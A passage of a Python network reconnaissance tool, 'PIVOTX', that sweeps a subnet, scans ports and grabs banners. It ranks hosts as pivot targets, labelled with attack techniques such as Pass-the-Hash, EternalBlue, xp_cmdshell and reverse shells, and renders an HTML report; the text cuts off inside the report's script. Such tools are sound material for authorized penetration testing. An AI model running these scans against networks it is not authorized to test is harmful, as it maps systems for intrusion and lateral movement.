#!/usr/bin/env python3
# ============================================================
#  PIVOTX — Network Pivot Discovery Framework
#  Uso: sudo python3 pivotx.py -n 192.168.1.0/24
# ============================================================

import sys, os, socket, struct, threading, time, json, subprocess
import argparse, ipaddress, datetime, random, signal
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── dependencias opcionales ──────────────────────────────────
try:
    from scapy.all import ARP, Ether, srp, conf as scapy_conf
    SCAPY = True
except ImportError:
    SCAPY = False

try:
    import netifaces
    NETIFACES = True
except ImportError:
    NETIFACES = False

# ── colores ANSI ─────────────────────────────────────────────
class C:
    RESET  = '\033[0m'
    CYAN   = '\033[96m'
    GREEN  = '\033[92m'
    RED    = '\033[91m'
    YELLOW = '\033[93m'
    PURPLE = '\033[95m'
    BLUE   = '\033[94m'
    GRAY   = '\033[90m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'

# ── puertos de interés para pivoting ────────────────────────
PIVOT_PORTS = {
    21:   ('FTP',        'file transfer / anon access'),
    22:   ('SSH',        'pivot via SSH tunnels / ProxyJump'),
    23:   ('Telnet',     'legacy access, cleartext creds'),
    25:   ('SMTP',       'mail relay / enum'),
    53:   ('DNS',        'DNS tunneling / zone transfer'),
    80:   ('HTTP',       'web shell / directory traversal'),
    88:   ('Kerberos',   '⚡ Domain Controller — high value'),
    110:  ('POP3',       'mail / creds'),
    135:  ('RPC',        'Windows RPC / lateral movement'),
    139:  ('NetBIOS',    'SMB / Windows enum'),
    143:  ('IMAP',       'mail creds'),
    389:  ('LDAP',       '⚡ Active Directory — enum users'),
    443:  ('HTTPS',      'reverse shell / C2 over TLS'),
    445:  ('SMB',        '⚡ EternalBlue / pass-the-hash'),
    636:  ('LDAPS',      'AD over SSL'),
    1080: ('SOCKS',      'proxy / pivot ready'),
    1433: ('MSSQL',      'database / xp_cmdshell'),
    1521: ('Oracle',     'database access'),
    2049: ('NFS',        'file share / mount'),
    3306: ('MySQL',      'database / UDF injection'),
    3389: ('RDP',        '⚡ Windows remote desktop'),
    4444: ('Metasploit', 'active meterpreter shell'),
    5432: ('PostgreSQL', 'database access'),
    5900: ('VNC',        'remote desktop / no auth'),
    5985: ('WinRM',      'PowerShell remoting'),
    6379: ('Redis',      'no-auth / RCE via config'),
    8080: ('HTTP-Alt',   'web app / proxy'),
    8443: ('HTTPS-Alt',  'alternative web'),
    8888: ('Jupyter',    'code execution / no auth'),
    9200: ('Elasticsearch','no-auth data exposure'),
    27017:('MongoDB',    'no-auth database'),
}

RISK_MAP = {
    88:   'CRITICAL',
    389:  'CRITICAL',
    445:  'CRITICAL',
    3389: 'CRITICAL',
    5985: 'HIGH',
    22:   'HIGH',
    23:   'HIGH',
    4444: 'HIGH',
    1433: 'HIGH',
    3306: 'HIGH',
    5900: 'HIGH',
    6379: 'HIGH',
    8888: 'HIGH',
    9200: 'HIGH',
    27017:'HIGH',
    80:   'MEDIUM',
    443:  'MEDIUM',
    21:   'MEDIUM',
    135:  'MEDIUM',
    139:  'MEDIUM',
    1080: 'MEDIUM',
    2049: 'MEDIUM',
    5432: 'MEDIUM',
    53:   'LOW',
    25:   'LOW',
    110:  'LOW',
    143:  'LOW',
    636:  'LOW',
}

BANNER = f"""
{C.CYAN}{C.BOLD}
  ██████╗ ██╗██╗   ██╗ ██████╗ ████████╗██╗  ██╗
  ██╔══██╗██║██║   ██║██╔═══██╗╚══██╔══╝╚██╗██╔╝
  ██████╔╝██║██║   ██║██║   ██║   ██║    ╚███╔╝ 
  ██╔═══╝ ██║╚██╗ ██╔╝██║   ██║   ██║    ██╔██╗ 
  ██║     ██║ ╚████╔╝ ╚██████╔╝   ██║   ██╔╝ ██╗
  ╚═╝     ╚═╝  ╚═══╝   ╚═════╝    ╚═╝   ╚═╝  ╚═╝
{C.RESET}{C.GRAY}  Network Pivot Discovery Framework  v1.0{C.RESET}
{C.RED}  ⚠  Solo para uso autorizado / entornos propios{C.RESET}
"""


# ═══════════════════════════════════════════════════════════
#  HOST DISCOVERY
# ═══════════════════════════════════════════════════════════

def discover_arp(network: str, timeout: int = 2) -> list[dict]:
    """ARP sweep — requiere scapy y root"""
    print(f"  {C.CYAN}[ARP]{C.RESET} Enviando ARP broadcast a {network}...")
    scapy_conf.verb = 0
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(ether/arp, timeout=timeout, verbose=False)
    hosts = []
    for sent, received in answered:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc,
            'method': 'ARP'
        })
    return hosts


def discover_ping(network: str, timeout: float = 0.5, workers: int = 100) -> list[dict]:
    """Ping sweep con sockets ICMP o subprocess"""
    print(f"  {C.CYAN}[PING]{C.RESET} Ping sweep a {network}...")
    net = ipaddress.ip_network(network, strict=False)
    hosts = []
    lock = threading.Lock()

    def ping_host(ip):
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1', str(ip)],
                capture_output=True, timeout=2
            )
            if result.returncode == 0:
                with lock:
                    hosts.append({'ip': str(ip), 'mac': 'N/A', 'method': 'PING'})
                return str(ip)
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(ping_host, ip): ip for ip in net.hosts()}
        done = 0
        total = sum(1 for _ in net.hosts())
        for f in as_completed(futures):
            done += 1
            r = f.result()
            if r:
                print(f"    {C.GREEN}[+]{C.RESET} {r} {C.GRAY}— alive{C.RESET}")
            pct = int(done / total * 30)
            bar = '█' * pct + '░' * (30 - pct)
            print(f"\r    {C.GRAY}[{bar}] {done}/{total}{C.RESET}", end='', flush=True)
    print()
    return hosts


def discover_hosts(network: str, method: str = 'auto') -> list[dict]:
    if method == 'auto':
        if SCAPY and os.geteuid() == 0:
            return discover_arp(network)
        else:
            return discover_ping(network)
    elif method == 'arp' and SCAPY:
        return discover_arp(network)
    else:
        return discover_ping(network)


# ═══════════════════════════════════════════════════════════
#  PORT SCANNER
# ═══════════════════════════════════════════════════════════

def scan_port(ip: str, port: int, timeout: float = 0.8) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except Exception:
        return False


def grab_banner(ip: str, port: int, timeout: float = 1.5) -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            if port in (80, 8080, 8443, 443):
                s.sendall(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = s.recv(256).decode('utf-8', errors='ignore').strip()
            return banner[:120].replace('\n', ' ').replace('\r', '')
    except Exception:
        return ''


def scan_host(ip: str, ports: list[int], workers: int = 50, grab_banners: bool = True) -> dict:
    open_ports = {}
    lock = threading.Lock()

    def check(port):
        if scan_port(ip, port):
            banner = grab_banner(ip, port) if grab_banners else ''
            info = PIVOT_PORTS.get(port, ('Unknown', ''))
            risk = RISK_MAP.get(port, 'LOW')
            with lock:
                open_ports[port] = {
                    'service': info[0],
                    'note': info[1],
                    'banner': banner,
                    'risk': risk
                }

    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(check, ports))

    return open_ports


def get_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ''


# ═══════════════════════════════════════════════════════════
#  PIVOT ANALYSIS
# ═══════════════════════════════════════════════════════════

def classify_host(ip: str, ports: dict) -> dict:
    port_list = list(ports.keys())
    role = 'UNKNOWN'
    pivot_methods = []
    risk_level = 'LOW'
    notes = []

    # Domain Controller
    if any(p in port_list for p in [88, 389, 636]):
        role = 'DOMAIN CONTROLLER'
        risk_level = 'CRITICAL'
        notes.append('Active Directory — objetivo de alto valor')
        pivot_methods.append('Pass-the-Hash / Kerberoasting')

    # Windows host
    elif any(p in port_list for p in [445, 135, 139]):
        role = 'WINDOWS HOST'
        risk_level = 'HIGH'
        if 3389 in port_list:
            pivot_methods.append('RDP lateral movement')
        if 445 in port_list:
            pivot_methods.append('SMB / PsExec / WMIExec')
        if 5985 in port_list:
            pivot_methods.append('WinRM / evil-winrm')

    # SSH server — ideal para pivot
    elif 22 in port_list:
        role = 'LINUX / SSH'
        risk_level = 'HIGH'
        pivot_methods.append('SSH -D SOCKS5 tunnel')
        pivot_methods.append('SSH -L/-R port forwarding')
        pivot_methods.append('Chisel / ligolo-ng via SSH')

    # Router / firewall
    elif any(p in port_list for p in [23, 161]):
        role = 'NETWORK DEVICE'
        risk_level = 'HIGH'
        pivot_methods.append('Telnet / SNMP enum')

    # Web server
    elif any(p in port_list for p in [80, 443, 8080, 8443]):
        role = 'WEB SERVER'
        risk_level = 'MEDIUM'
        pivot_methods.append('Web shell upload')
        pivot_methods.append('Reverse shell via HTTP/S')

    # Database
    elif any(p in port_list for p in [3306, 1433, 5432, 27017, 6379]):
        role = 'DATABASE SERVER'
        risk_level = 'HIGH'
        if 3306 in port_list:
            pivot_methods.append('MySQL UDF injection')
        if 1433 in port_list:
            pivot_methods.append('MSSQL xp_cmdshell')
        if 6379 in port_list:
            pivot_methods.append('Redis config RCE')

    # SOCKS proxy ya activo
    if 1080 in port_list:
        pivot_methods.append('SOCKS5 proxy directo (:1080)')
        risk_level = 'HIGH'

    # VNC
    if 5900 in port_list:
        pivot_methods.append('VNC remote access')

    # Jupyter
    if 8888 in port_list:
        pivot_methods.append('Jupyter notebook — code exec')

    # Determinar risk_level final por puertos críticos
    crit_ports = [p for p in port_list if RISK_MAP.get(p) == 'CRITICAL']
    high_ports  = [p for p in port_list if RISK_MAP.get(p) == 'HIGH']
    if crit_ports:
        risk_level = 'CRITICAL'
    elif high_ports and risk_level not in ('CRITICAL',):
        risk_level = 'HIGH'

    return {
        'role': role,
        'risk': risk_level,
        'pivot_methods': pivot_methods,
        'notes': notes,
    }


def build_pivot_chain(results: list[dict]) -> list[dict]:
    """Ordena hosts por utilidad para pivoting"""
    score_map = {'CRITICAL': 100, 'HIGH': 60, 'MEDIUM': 30, 'LOW': 10}
    role_score = {
        'LINUX / SSH': 40,
        'DOMAIN CONTROLLER': 80,
        'WINDOWS HOST': 50,
        'NETWORK DEVICE': 35,
        'DATABASE SERVER': 30,
        'WEB SERVER': 20,
    }
    for h in results:
        s = score_map.get(h['analysis']['risk'], 0)
        s += role_score.get(h['analysis']['role'], 0)
        s += len(h['analysis']['pivot_methods']) * 5
        h['pivot_score'] = s
    return sorted(results, key=lambda x: x['pivot_score'], reverse=True)


# ═══════════════════════════════════════════════════════════
#  REPORT HTML
# ═══════════════════════════════════════════════════════════


def generate_html_report(results: list[dict], network: str, scan_time: str, duration: float) -> str:
    import ipaddress, collections

    risk_colors = {
        'CRITICAL': '#ff2d55',
        'HIGH':     '#ff8c00',
        'MEDIUM':   '#ffd700',
        'LOW':      '#00ff9d',
    }

    # ── Estadísticas ────────────────────────────────────────
    total     = len(results)
    critical  = sum(1 for h in results if h['analysis']['risk'] == 'CRITICAL')
    high      = sum(1 for h in results if h['analysis']['risk'] == 'HIGH')
    medium    = sum(1 for h in results if h['analysis']['risk'] == 'MEDIUM')
    low       = sum(1 for h in results if h['analysis']['risk'] == 'LOW')
    ssh_hosts = sum(1 for h in results if 22  in h['ports'])
    smb_hosts = sum(1 for h in results if 445 in h['ports'])
    rdp_hosts = sum(1 for h in results if 3389 in h['ports'])

    # % red escaneada
    try:
        net_obj   = ipaddress.ip_network(network, strict=False)
        net_total = sum(1 for _ in net_obj.hosts())
        pct_scanned = round(total / net_total * 100, 1) if net_total else 0
    except Exception:
        net_total   = 0
        pct_scanned = 0

    # Host más vulnerable (mayor score)
    top_host = results[0] if results else None
    top_ip   = top_host['ip']       if top_host else 'N/A'
    top_role = top_host['analysis']['role'] if top_host else ''
    top_risk = top_host['analysis']['risk'] if top_host else ''
    top_rc   = risk_colors.get(top_risk, '#7a9ab5')

    # Puertos más frecuentes (para gráfico de barras)
    port_counter = collections.Counter()
    for h in results:
        for p in h['ports']:
            svc = h['ports'][p]['service']
            port_counter[f'{p}/{svc}'] += 1
    top_ports = port_counter.most_common(10)

    # Datos JSON para JS
    import json as _json
    bar_labels = _json.dumps([p[0] for p in top_ports])
    bar_values = _json.dumps([p[1] for p in top_ports])
    bar_colors = _json.dumps([
        risk_colors.get(RISK_MAP.get(int(p[0].split('/')[0]), 'LOW'), '#3d5a73')
        for p in top_ports
    ])

    # Nodos y edges para el mapa de red
    net_nodes = []
    net_edges = []
    node_color_map = {
        'CRITICAL': '#ff2d55', 'HIGH': '#ff8c00',
        'MEDIUM': '#ffd700',   'LOW': '#00ff9d', '': '#3d5a73'
    }
    for i, h in enumerate(results):
        rc = node_color_map.get(h['analysis']['risk'], '#3d5a73')
        net_nodes.append({
            'id': i, 'ip': h['ip'],
            'role': h['analysis']['role'],
            'risk': h['analysis']['risk'],
            'color': rc,
            'score': h.get('pivot_score', 0),
            'ports': len(h['ports'])
        })
    # Edges: conectar hosts con puertos de pivot en común o misma subred /24
    def same_24(a, b):
        try:
            return '.'.join(a.split('.')[:3]) == '.'.join(b.split('.')[:3])
        except Exception:
            return False
    for i in range(len(results)):
        for j in range(i+1, min(i+4, len(results))):
            if same_24(results[i]['ip'], results[j]['ip']) or j == i+1:
                net_edges.append({'from': i, 'to': j})

    nodes_json = _json.dumps(net_nodes)
    edges_json = _json.dumps(net_edges)

    # ── Filas tabla ─────────────────────────────────────────
    rows = ''
    for i, h in enumerate(results):
        ip       = h['ip']
        hostname = h.get('hostname', '')
        role     = h['analysis']['role']
        risk     = h['analysis']['risk']
        rcolor   = risk_colors.get(risk, '#7a9ab5')
        methods  = h['analysis']['pivot_methods']
        ports    = h['ports']
        score    = h.get('pivot_score', 0)
        mac      = h.get('mac', 'N/A')

        port_tags = ''
        for port, info in sorted(ports.items()):
            pr = RISK_MAP.get(port, 'LOW')
            pc = risk_colors.get(pr, '#3d5a73')
            port_tags += f'<span class="port-tag" style="border-color:{pc}40;color:{pc}">{port}/{info["service"]}</span>'

        method_tags = ''.join(f'<span class="method-tag">{m}</span>' for m in methods[:4])
        bar_w = min(int(score / 2), 100)

        rows += f"""
        <tr class="host-row" onclick="toggleExpand({i})">
          <td><span class="ip-mono">{ip}</span><br><span class="small-gray">{hostname or mac}</span></td>
          <td><span class="role-badge">{role}</span></td>
          <td>{port_tags}</td>
          <td><span style="color:{rcolor};font-weight:700;font-family:'Share Tech Mono',monospace">{risk}</span></td>
          <td>
            <div class="score-bar"><div class="score-fill" style="width:{bar_w}%;background:{rcolor}"></div></div>
            <span class="small-gray">{score}pts</span>
          </td>
          <td>{method_tags}</td>
        </tr>
        <tr class="expand-row" id="expand-{i}" style="display:none">
          <td colspan="6">
            <div class="expand-body">
              <div class="expand-col">
                <div class="expand-title">BANNER GRAB</div>
                {''.join(f'<div class="banner-line"><span class="port-num">:{p}</span> {info["banner"] or "<span style=opacity:.4>no banner</span>"}</div>' for p,info in sorted(ports.items()) if info.get("banner"))}
                {'<span class="small-gray">No banners capturados</span>' if not any(info.get('banner') for info in ports.values()) else ''}
              </div>
              <div class="expand-col">
                <div class="expand-title">COMANDOS SUGERIDOS</div>
                {_suggested_cmds(ip, ports)}
              </div>
            </div>
          </td>
        </tr>"""

    # ── Pivot chain top 5 ────────────────────────────────────
    chain_html = ''
    for idx, h in enumerate(results[:5]):
        rc    = risk_colors.get(h['analysis']['risk'], '#3d5a73')
        arrow = '' if idx == len(results[:5])-1 else '<div class="chain-arrow">▼</div>'
        chain_html += f"""
        <div class="chain-node" style="border-color:{rc}40">
          <div class="chain-dot" style="background:{rc};box-shadow:0 0 8px {rc}"></div>
          <div>
            <div class="chain-ip">{h['ip']}</div>
            <div class="chain-role" style="color:{rc}">{h['analysis']['role']}</div>
            <div class="chain-risk">{h['analysis']['risk']}</div>
          </div>
        </div>{arrow}"""

    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>PIVOTX Report — {network}</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
<style>
:root{{
  --bg:#050608;--bg2:#080b10;--bg3:#0d1117;--border:#1a2535;--border2:#0f3a5c;
  --cyan:#00d4ff;--red:#ff2d55;--green:#00ff9d;--orange:#ff8c00;--yellow:#ffd700;
  --purple:#9d4edd;--text:#c8d8e8;--text2:#7a9ab5;--text3:#3d5a73;
}}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;font-size:14px}}
body::before{{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,212,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}}
.wrap{{position:relative;z-index:1;max-width:1500px;margin:0 auto;padding:24px}}

/* HEADER */
.header{{display:flex;align-items:center;gap:20px;padding:20px 28px;background:var(--bg2);border:1px solid var(--border);margin-bottom:20px;position:relative;overflow:hidden}}
.header::after{{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--cyan),transparent);animation:shimmer 3s infinite}}
@keyframes shimmer{{0%,100%{{opacity:.3}}50%{{opacity:1}}}}
.logo-svg{{filter:drop-shadow(0 0 10px rgba(0,212,255,.9));animation:logoPulse 3s ease-in-out infinite;flex-shrink:0}}
@keyframes logoPulse{{0%,100%{{filter:drop-shadow(0 0 6px rgba(0,212,255,.6))}}50%{{filter:drop-shadow(0 0 18px rgba(0,212,255,1))}}}}
.logo-text{{font-family:'Orbitron',monospace;font-weight:900;font-size:28px;letter-spacing:6px;color:var(--cyan);text-shadow:0 0 20px rgba(0,212,255,.5)}}
.logo-sub{{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text3);letter-spacing:2px;margin-top:3px}}
.header-metas{{margin-left:auto;display:flex;gap:28px;align-items:center}}
.hmeta{{text-align:center;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text3)}}
.hmeta-val{{font-family:'Orbitron',monospace;font-size:16px;font-weight:700;color:var(--cyan);display:block;margin-bottom:2px}}
.hmeta-val.red{{color:var(--red)}}
.hmeta-val.green{{color:var(--green)}}
.hmeta-divider{{width:1px;height:40px;background:var(--border)}}

/* TOP HOST CARD */
.top-host-card{{background:rgba(255,45,85,.06);border:1px solid rgba(255,45,85,.25);padding:10px 16px;display:flex;align-items:center;gap:14px;flex-shrink:0}}
.thc-label{{font-family:'Share Tech Mono',monospace;font-size:8px;letter-spacing:2px;color:var(--text3);text-transform:uppercase;margin-bottom:3px}}
.thc-ip{{font-family:'Share Tech Mono',monospace;font-size:14px;font-weight:700}}
.thc-role{{font-size:11px;font-weight:600;margin-top:1px}}
.thc-icon{{font-size:22px;opacity:.7}}

/* STATS */
.stats-grid{{display:grid;grid-template-columns:repeat(8,1fr);gap:10px;margin-bottom:20px}}
.stat-box{{background:var(--bg2);border:1px solid var(--border);padding:12px 14px;position:relative;overflow:hidden}}
.stat-box::before{{content:'';position:absolute;top:0;left:0;right:0;height:2px}}
.stat-box.cyan::before{{background:var(--cyan)}}
.stat-box.red::before{{background:var(--red)}}
.stat-box.orange::before{{background:var(--orange)}}
.stat-box.green::before{{background:var(--green)}}
.stat-box.purple::before{{background:var(--purple)}}
.stat-box.yellow::before{{background:var(--yellow)}}
.stat-val{{font-family:'Orbitron',monospace;font-size:22px;font-weight:700}}
.stat-box.cyan .stat-val{{color:var(--cyan)}}
.stat-box.red .stat-val{{color:var(--red)}}
.stat-box.orange .stat-val{{color:var(--orange)}}
.stat-box.green .stat-val{{color:var(--green)}}
.stat-box.purple .stat-val{{color:var(--purple)}}
.stat-box.yellow .stat-val{{color:var(--yellow)}}
.stat-lbl{{font-size:9px;color:var(--text3);letter-spacing:1.5px;text-transform:uppercase;margin-top:4px;font-weight:600}}

/* GRID PRINCIPAL */
.main-grid{{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}}
.main-grid-3{{display:grid;grid-template-columns:1fr 380px;gap:16px;margin-bottom:16px}}

/* PANEL */
.panel{{background:var(--bg2);border:1px solid var(--border);position:relative;overflow:hidden}}
.panel::before{{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,var(--cyan),transparent);opacity:.5}}
.panel-hdr{{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;border-bottom:1px solid var(--border)}}
.panel-title{{font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:2px;color:var(--text2);text-transform:uppercase}}
.panel-body{{padding:16px}}

/* NETWORK MAP */
#netmap{{width:100%;height:340px;background:#020408;display:block;cursor:grab}}
#netmap:active{{cursor:grabbing}}
.netmap-tooltip{{position:absolute;background:#0d1117;border:1px solid var(--cyan);padding:8px 12px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text);pointer-events:none;display:none;z-index:100;max-width:200px;line-height:1.6}}

/* BAR CHART */
.chart-wrap{{padding:16px;height:280px;position:relative}}

/* TABLE */
table{{width:100%;border-collapse:collapse}}
th{{font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--text3);text-align:left;padding:8px 12px;border-bottom:1px solid var(--border);text-transform:uppercase;white-space:nowrap}}
.host-row{{cursor:pointer;transition:background .15s}}
.host-row:hover td{{background:rgba(0,212,255,.04)}}
.host-row td{{padding:9px 12px;border-bottom:1px solid rgba(26,37,53,.5);vertical-align:middle}}
.ip-mono{{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--text)}}
.small-gray{{font-size:10px;color:var(--text3);font-family:'Share Tech Mono',monospace}}
.role-badge{{font-family:'Share Tech Mono',monospace;font-size:9px;padding:2px 7px;background:rgba(0,212,255,.08);color:var(--cyan);border:1px solid rgba(0,212,255,.2)}}
.port-tag{{font-family:'Share Tech Mono',monospace;font-size:9px;padding:1px 5px;border:1px solid;margin:1px;display:inline-block}}
.method-tag{{font-size:10px;padding:1px 6px;background:rgba(157,78,221,.1);color:var(--purple);border:1px solid rgba(157,78,221,.2);margin:1px;display:inline-block}}
.score-bar{{height:3px;background:var(--border);width:70px;margin-bottom:3px}}
.score-fill{{height:3px}}

/* EXPAND */
.expand-row td{{padding:0}}
.expand-body{{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border)}}
.expand-col{{background:#050d14;padding:14px 16px}}
.expand-title{{font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--text3);margin-bottom:8px;text-transform:uppercase}}
.banner-line{{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text2);padding:3px 0;border-bottom:1px solid var(--border)}}
.port-num{{color:var(--cyan)}}
.cmd-block{{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);background:#020408;padding:6px 10px;margin-bottom:6px;border-left:2px solid var(--green);white-space:pre-wrap;word-break:break-all}}

/* PIVOT CHAIN */
.chain-node{{display:flex;align-items:center;gap:10px;padding:9px 12px;border:1px solid;background:rgba(0,0,0,.2)}}
.chain-dot{{width:8px;height:8px;border-radius:50%;flex-shrink:0}}
.chain-ip{{font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text)}}
.chain-role{{font-size:10px;font-weight:600;letter-spacing:.5px}}
.chain-risk{{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text3)}}
.chain-arrow{{text-align:center;color:var(--text3);font-size:11px;padding:1px}}

/* FOOTER */
.footer{{text-align:center;padding:20px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text3);border-top:1px solid var(--border);margin-top:20px}}
::-webkit-scrollbar{{width:4px}}
::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--border2)}}
</style>
</head>
<body>
<div class="wrap">

<!-- HEADER -->
<div class="header">
  <svg width="50" height="50" viewBox="0 0 42 42" fill="none" class="logo-svg">
    <polygon points="21,2 37,11 37,31 21,40 5,31 5,11" fill="none" stroke="#00d4ff" stroke-width="1.5"/>
    <polygon points="21,9 31,14.5 31,27.5 21,33 11,27.5 11,14.5" fill="none" stroke="#00a8cc" stroke-width="1" opacity=".5"/>
    <line x1="14" y1="14" x2="28" y2="28" stroke="#00d4ff" stroke-width="2" stroke-linecap="round"/>
    <line x1="28" y1="14" x2="14" y2="28" stroke="#00d4ff" stroke-width="2" stroke-linecap="round"/>
    <circle cx="21" cy="21" r="3" fill="#00d4ff"/>
    <polyline points="10,21 14,17 14,25" fill="none" stroke="#ff2d55" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    <polyline points="32,21 28,17 28,25" fill="none" stroke="#ff2d55" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    <circle cx="21" cy="5" r="1.5" fill="#00d4ff" opacity=".6"/>
    <circle cx="21" cy="37" r="1.5" fill="#00d4ff" opacity=".6"/>
  </svg>
  <div>
    <div class="logo-text">PIVOTX</div>
    <div class="logo-sub">NETWORK PIVOT DISCOVERY FRAMEWORK</div>
  </div>

  <div class="header-metas">
    <div class="hmeta"><span class="hmeta-val">{network}</span>TARGET</div>
    <div class="hmeta-divider"></div>
    <div class="hmeta"><span class="hmeta-val">{scan_time}</span>FECHA SCAN</div>
    <div class="hmeta-divider"></div>
    <div class="hmeta"><span class="hmeta-val">{duration:.1f}s</span>DURACIÓN</div>
    <div class="hmeta-divider"></div>
    <div class="hmeta"><span class="hmeta-val green">{pct_scanned}%</span>RED ESCANEADA</div>
    <div class="hmeta-divider"></div>
    <div class="top-host-card">
      <div class="thc-icon">🎯</div>
      <div>
        <div class="thc-label">HOST MÁS VULNERABLE</div>
        <div class="thc-ip" style="color:{top_rc}">{top_ip}</div>
        <div class="thc-role" style="color:{top_rc}">{top_role}</div>
      </div>
    </div>
  </div>
</div>

<!-- STATS (8 cajas) -->
<div class="stats-grid">
  <div class="stat-box cyan"><div class="stat-val">{total}</div><div class="stat-lbl">Hosts Activos</div></div>
  <div class="stat-box red"><div class="stat-val">{critical}</div><div class="stat-lbl">Critical</div></div>
  <div class="stat-box orange"><div class="stat-val">{high}</div><div class="stat-lbl">High Risk</div></div>
  <div class="stat-box yellow"><div class="stat-val">{medium}</div><div class="stat-lbl">Medium</div></div>
  <div class="stat-box green"><div class="stat-val">{low}</div><div class="stat-lbl">Low Risk</div></div>
  <div class="stat-box green"><div class="stat-val">{ssh_hosts}</div><div class="stat-lbl">SSH Pivots</div></div>
  <div class="stat-box purple"><div class="stat-val">{smb_hosts}</div><div class="stat-lbl">SMB Hosts</div></div>
  <div class="stat-box red"><div class="stat-val">{rdp_hosts}</div><div class="stat-lbl">RDP Expuesto</div></div>
</div>

<!-- GRÁFICAS: MAPA + BARRAS -->
<div class="main-grid" style="margin-bottom:16px">

  <!-- MAPA DE RED INTERACTIVO -->
  <div class="panel" style="position:relative">
    <div class="panel-hdr">
      <div class="panel-title">MAPA DE RED — NODOS INTERACTIVOS</div>
      <div style="display:flex;gap:12px">
        <span style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text3)">
          <span style="color:#ff2d55">●</span> CRITICAL &nbsp;
          <span style="color:#ff8c00">●</span> HIGH &nbsp;
          <span style="color:#ffd700">●</span> MEDIUM &nbsp;
          <span style="color:#00ff9d">●</span> LOW
        </span>
      </div>
    </div>
    <canvas id="netmap"></canvas>
    <div class="netmap-tooltip" id="tooltip"></div>
  </div>

  <!-- BARRAS: PUERTOS MÁS FRECUENTES -->
  <div class="panel">
    <div class="panel-hdr">
      <div class="panel-title">PUERTOS MÁS FRECUENTES</div>
      <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text3)">TOP {len(top_ports)}</div>
    </div>
    <div class="chart-wrap">
      <canvas id="barChart"></canvas>
    </div>
  </div>
</div>

<!-- TABLA + PIVOT CHAIN -->
<div class="main-grid-3" style="margin-bottom:16px">
  <div class="panel">
    <div class="panel-hdr">
      <div class="panel-title">HOST REGISTRY — PIVOT ANALYSIS</div>
      <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text3)">CLICK FILA PARA EXPANDIR</div>
    </div>
    <div style="overflow-x:auto">
      <table>
        <thead><tr>
          <th>IP / HOST</th><th>TIPO</th><th>PUERTOS</th>
          <th>RIESGO</th><th>SCORE</th><th>MÉTODOS PIVOT</th>
        </tr></thead>
        <tbody>{rows}</tbody>
      </table>
    </div>
  </div>

  <div class="panel">
    <div class="panel-hdr"><div class="panel-title">RUTA DE PIVOT SUGERIDA</div></div>
    <div class="panel-body" style="padding:12px">
      {chain_html}
    </div>
  </div>
</div>

<div class="footer">PIVOTX v1.0 — SOLO PARA USO AUTORIZADO — {scan_time} — {network} — {total} hosts / {net_total} totales ({pct_scanned}% escaneado)</div>
</div>

<div class="netmap-tooltip" id="tooltip"></div>

<script>
// ══════════════════════════════════════
//  MAPA DE RED INTERACTIVO (Canvas)
// ══════════════════════════════════════
const NODES = {nodes_json};
const EDGES = {edges_json};

const canvas = document.getElementById('netmap');
const ctx    = canvas.getContext('2d');
const tooltip = document.getElementById('tooltip');

function resizeCanvas() {{
  canvas.width  = canvas.parentElement.clientWidth;
  canvas.height = 340;
}}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

// Layout circular con centro en host más peligroso
const W = () => canvas.width, H = () => canvas.height;
let positions = {{}};
let dragging  = null;
let dragOffset = {{x:0,y:0}};
let animT = 0;

function initPositions() {{
  const n = NODES.length;
  if (n === 0) return;
  // Primer nodo (más peligroso) al centro
  positions[0] = {{ x: W()/2, y: H()/2 }};
  for (let i = 1; i < n; i++) {{
    const angle = ((i-1) / (n-1)) * Math.PI * 2;
